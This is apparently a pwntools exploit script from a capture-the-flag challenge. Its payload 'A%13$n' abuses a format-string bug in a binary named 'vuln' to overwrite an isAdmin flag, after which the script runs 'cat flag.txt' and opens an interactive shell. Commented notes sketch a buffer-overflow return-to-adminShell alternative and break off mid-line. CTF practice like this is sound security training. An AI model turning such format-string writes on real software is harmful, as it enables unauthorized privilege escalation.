#!/usr/bin/env python3
from pwn import *


exe = ELF("./vuln")
context.binary = exe

if args.REMOTE:
    r = remote("chals.disorientation.cssa.club", 2457)
else:
    r = process(exe.path)
    if args.GDB:
        gdb.attach(r)



# Format string vuln writes 'A' -> 1 at stack offset 13 i.e the admin_t struct
# The program itself now calls adminShell() with isAdmin = 1
payload = b"A%13$n"
r.sendlineafter(b".", payload)
r.sendline(b"cat flag.txt")
r.interactive()


# Possible ret2 adminShell()?
# address of admin shell
# admin_shell = exe.sym["adminShell"]
# Enter device ID to connect to:
# Buffer overflow
# r.sendlineafter(b":", b"test")
# r.interactive(


